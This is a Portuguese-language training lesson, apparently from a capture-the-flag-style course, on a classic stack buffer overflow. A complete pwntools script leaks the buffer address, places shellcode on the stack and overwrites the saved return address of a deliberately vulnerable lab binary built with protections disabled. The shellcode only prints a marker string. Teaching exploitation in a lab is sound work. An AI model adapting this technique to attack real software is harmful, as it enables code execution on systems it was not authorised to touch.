# Buffer overflow: controlar o RIP e saltar para o buffer

Agora voce junta as duas metades do dojo: a **corrupcao** (sobrescrever o endereco
de retorno) e o **shellcode** (os bytes que voce escreveu nos modulos 1 a 7). Em
vez de pular para uma funcao que ja existe, voce vai apontar o retorno para o
**proprio buffer**, onde o seu shellcode esta.

## O programa vulneravel

`/challenge/vuln.c` e compilado com a **pilha executavel** (`-z execstack`) e **sem
ASLR**. Ele imprime o endereco do buffer:

```
[leak] buf = 0x7fffffffe2b0
```

Como a randomizacao esta desligada e o ambiente e fixo, esse endereco e o mesmo
quando o `/challenge/check` roda. O offset ate o endereco de retorno e **136**
(128 do buffer + 8 do rbp salvo).

## O plano

```
buffer: [ shellcode ][ NOPs ... ][ endereco de retorno = buf ]
          ^-- buf                ^-- offset 136
```

Ao fazer `ret`, a CPU pula para `buf`, que e onde seu shellcode comeca.

## O que voce precisa fazer

O `solve.py` ja automatiza o vazamento do endereco (ele compila o mesmo binario,
roda uma vez e le a linha `[leak]`):

```python
from pwn import asm, p64, context
import subprocess, re

context.arch = "amd64"
subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

# placeholder para o leak usar o mesmo argv do check
open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

shellcode = asm('''
    mov eax, 1
    mov edi, 1
    lea rsi, [rip + message]
    mov edx, 7
    syscall
    mov eax, 60
    xor edi, edi
    syscall
message:
    .ascii "RIP_OK\\n"
''')

offset = 136
payload  = shellcode
payload += b"\x90" * (offset - len(shellcode))
payload += p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
```

## Fluxo completo

```bash
python3 /home/hacker/solve.py
/challenge/check
```

## Por que isto importa

Este e o stack buffer overflow classico com shellcode na pilha. Ele so funciona
porque desligamos NX (pilha executavel), ASLR e canaries - exatamente as defesas
que existem para impedi-lo. No mundo real, cada uma dessas protecoes quebra este
caminho, e por isso tecnicas mais novas (ROP, ret2libc) existem.
